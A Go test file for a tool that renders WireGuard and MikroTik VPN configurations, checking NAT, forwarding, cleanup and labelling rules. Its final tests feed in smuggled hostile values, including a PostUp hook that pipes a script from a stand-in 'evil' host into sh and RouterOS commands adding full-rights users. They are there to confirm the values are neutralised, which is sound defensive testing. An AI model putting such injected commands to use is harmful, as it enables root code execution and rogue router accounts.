package services

import (
	"strings"
	"testing"

	"github.com/stretchr/testify/require"
)

func renderInput() PeerConfigInput {
	return PeerConfigInput{
		PeerPrivateKey:  "PEERPRIV",
		PeerAddress:     "10.88.0.5",
		ServerPublicKey: "SERVERPUB",
		EndpointHost:    "vpn.contoh.id",
		TunnelSubnet:    "10.88.0.0/24",
		ListenPort:      51820,
		Keepalive:       25,
		AllowedIPs:      []string{"10.10.10.0/24"},
	}
}

func TestRenderWGQuickConfig(t *testing.T) {
	expected := `# TikMan VPN
[Interface]
PrivateKey = PEERPRIV
Address = 10.88.0.5/24
PostUp = sysctl -w net.ipv4.ip_forward=1
PostUp = iptables -A FORWARD -i %i -j ACCEPT
PostUp = iptables -A FORWARD -o %i -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT
PostUp = iptables -t nat -A POSTROUTING -s 10.88.0.0/24 -d 10.10.10.0/24 -j MASQUERADE
PostDown = iptables -t nat -D POSTROUTING -s 10.88.0.0/24 -d 10.10.10.0/24 -j MASQUERADE
PostDown = iptables -D FORWARD -i %i -j ACCEPT
PostDown = iptables -D FORWARD -o %i -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT

[Peer]
PublicKey = SERVERPUB
Endpoint = vpn.contoh.id:51820
AllowedIPs = 10.88.0.0/24
PersistentKeepalive = 25
`
	require.Equal(t, expected, RenderWGQuickConfig(renderInput()))
}

func TestRenderWGQuickConfigOneRulePerSubnet(t *testing.T) {
	in := renderInput()
	in.AllowedIPs = []string{"10.10.10.0/24", "192.168.88.0/24"}

	output := RenderWGQuickConfig(in)
	require.Equal(t, 2, strings.Count(output, "-A POSTROUTING"))
	require.Equal(t, 2, strings.Count(output, "-D POSTROUTING"))
	require.Contains(t, output, "-d 192.168.88.0/24 -j MASQUERADE")
}

// Without forwarding the masquerade rules never run: POSTROUTING is reached
// only after the routing decision, and the packet is dropped before that.
func TestRenderWGQuickConfigEnablesForwarding(t *testing.T) {
	output := RenderWGQuickConfig(renderInput())

	forwarding := strings.Index(output, "net.ipv4.ip_forward=1")
	accept := strings.Index(output, "iptables -A FORWARD -i %i -j ACCEPT")
	masquerade := strings.Index(output, "-A POSTROUTING")

	require.NotEqual(t, -1, forwarding)
	require.NotEqual(t, -1, accept)
	require.Less(t, forwarding, masquerade, "forwarding must be on before the NAT rules are installed")
	require.Less(t, accept, masquerade)
	require.Contains(t, output, "PostDown = iptables -D FORWARD -i %i -j ACCEPT")
}

// The OLT's reply is un-SNATted by conntrack before the routing decision, so
// the FORWARD chain sees it as in=LAN out=%i: the inbound rule never matches
// it and a DROP policy takes it. Only a return-direction rule lets the reply
// through, and only ESTABLISHED,RELATED keeps the site's LAN from initiating
// into the tunnel on the back of it.
func TestRenderWGQuickConfigAcceptsTheReturnDirection(t *testing.T) {
	output := RenderWGQuickConfig(renderInput())

	accept := strings.Index(output, "PostUp = iptables -A FORWARD -o %i -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT")
	masquerade := strings.Index(output, "-A POSTROUTING")

	require.NotEqual(t, -1, accept, "without the return rule the OLT answers and the reply is dropped")
	require.Less(t, accept, masquerade)
	require.NotContains(t, output, "FORWARD -o %i -j ACCEPT",
		"a blanket return rule would let the site's LAN initiate into the tunnel")
	require.Contains(t, output, "PostDown = iptables -D FORWARD -o %i -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT")
}

func TestRenderWGQuickConfigNeverTunnelsAllTraffic(t *testing.T) {
	output := RenderWGQuickConfig(renderInput())
	require.NotContains(t, output, "0.0.0.0/0",
		"the site must keep its own internet path; only the tunnel subnet is routed to the VPS")
}

func TestRenderMikroTikConfig(t *testing.T) {
	output := RenderMikroTikConfig(renderInput())

	require.Contains(t, output, `/interface/wireguard/add name=wg-tikman private-key="PEERPRIV" listen-port=13231`)
	require.Contains(t, output, "/ip/address/add address=10.88.0.5/24 interface=wg-tikman")
	require.Contains(t, output, `public-key="SERVERPUB"`)
	require.Contains(t, output, `endpoint-address="vpn.contoh.id" endpoint-port=51820`)
	require.Contains(t, output, "allowed-address=10.88.0.0/24")
	require.Contains(t, output, "persistent-keepalive=25s")
	require.Contains(t, output, "chain=srcnat src-address=10.88.0.0/24 dst-address=10.10.10.0/24 action=masquerade")
}

func TestRenderMikroTikConfigNeedsNoInterfaceName(t *testing.T) {
	output := RenderMikroTikConfig(renderInput())
	require.NotContains(t, output, "out-interface=",
		"the NAT rule must not ask the operator to know the name of the LAN interface")
}

func TestRenderMikroTikConfigCleansItsOwnObjectsFirst(t *testing.T) {
	output := RenderMikroTikConfig(renderInput())

	// RouterOS lets two NAT rules with the same comment coexist, so a second
	// paste after a subnet change would leave the old subnet's rule behind.
	require.Contains(t, output, `/ip/firewall/nat/remove [find comment~"TikMan VPN"]`)
	require.Contains(t, output, `/interface/wireguard/peers/remove [find interface="wg-tikman"]`)
	require.Contains(t, output, `/ip/address/remove [find interface="wg-tikman"]`)
	require.Contains(t, output, `/interface/wireguard/remove [find name="wg-tikman"]`)

	require.Less(t, strings.Index(output, "/interface/wireguard/remove"),
		strings.Index(output, "/interface/wireguard/add"),
		"the cleanup has to run before the interface is created again")
}

func TestRenderMikroTikConfigScopesEveryRemoval(t *testing.T) {
	output := RenderMikroTikConfig(renderInput())

	// An unscoped remove would wipe the router's other tunnels and NAT rules.
	for _, line := range strings.Split(output, "\n") {
		if !strings.Contains(line, "/remove") {
			continue
		}
		require.Contains(t, line, "[find ", "removal must select, never take everything: %s", line)
		require.True(t,
			strings.Contains(line, "wg-tikman") || strings.Contains(line, "TikMan VPN"),
			"removal must be scoped to what this block created: %s", line)
	}
}

func TestRenderMikroTikConfigNamesTheSiteOnEveryObject(t *testing.T) {
	in := renderInput()
	in.SiteName = "POP Cikarang"

	output := RenderMikroTikConfig(in)

	// Someone opening this router months later should not have to guess what
	// wg-tikman is or which system created it.
	for _, object := range []string{
		"/interface/wireguard/add",
		"/ip/address/add",
		"/interface/wireguard/peers/add",
		"/ip/firewall/nat/add",
	} {
		line := lineStartingWith(t, output, object)
		require.Contains(t, line, `comment="TikMan VPN - POP Cikarang"`, object)
	}

	// The removal still has to find those rules on the next paste, which is why
	// the label keeps the prefix the selector matches on.
	require.Contains(t, output, `[find comment~"TikMan VPN"]`)
}

func TestRenderWGQuickConfigNamesTheSite(t *testing.T) {
	in := renderInput()
	in.SiteName = "POP Cikarang"

	require.True(t, strings.HasPrefix(RenderWGQuickConfig(in), "# TikMan VPN - POP Cikarang\n"))
}

func lineStartingWith(t *testing.T, output, prefix string) string {
	t.Helper()
	for _, line := range strings.Split(output, "\n") {
		if strings.HasPrefix(line, prefix) {
			return line
		}
	}
	t.Fatalf("no line starting with %q", prefix)
	return ""
}

func TestRenderWGQuickConfigCannotBeMadeToRunACommand(t *testing.T) {
	in := renderInput()
	// wg-quick runs any PostUp it finds as root when the site brings the tunnel
	// up, so a newline in a site name is not a formatting quirk.
	in.SiteName = "Site A\n[Interface]\nPostUp = curl -s http://evil/x.sh | sh"

	for _, line := range strings.Split(RenderWGQuickConfig(in), "\n") {
		require.False(t, strings.HasPrefix(strings.TrimSpace(line), "PostUp = curl"),
			"a site name must not be able to add a hook: %q", line)
	}
}

func TestRenderMikroTikConfigCannotBeMadeToAddACommand(t *testing.T) {
	in := renderInput()
	in.EndpointHost = "1.2.3.4;/user/add name=hax password=hax group=full;"
	in.SiteName = "Site A\n/user/add name=hax2 password=hax2 group=full"

	output := strings.TrimSpace(RenderMikroTikConfig(in))
	lines := strings.Split(output, "\n")

	// One command per line, and the hostile values stay inside their quoted
	// value rather than becoming commands of their own.
	require.Len(t, lines, 9)
	require.Contains(t, output, `endpoint-address="1.2.3.4;/user/add name=hax password=hax group=full;"`)
	for _, line := range lines {
		require.False(t, strings.HasPrefix(strings.TrimSpace(line), "/user/add"),
			"no injected command may start a line: %q", line)
	}
}

func TestMikrotikQuoteNeutralisesRouterOSSubstitution(t *testing.T) {
	// RouterOS expands $name inside double quotes, which Go's %q leaves alone.
	require.Equal(t, `"a\$b"`, mikrotikQuote("a$b"))
	require.Equal(t, `"a\"b"`, mikrotikQuote(`a"b`))
	require.Equal(t, `"ab"`, mikrotikQuote("a\nb"))
}
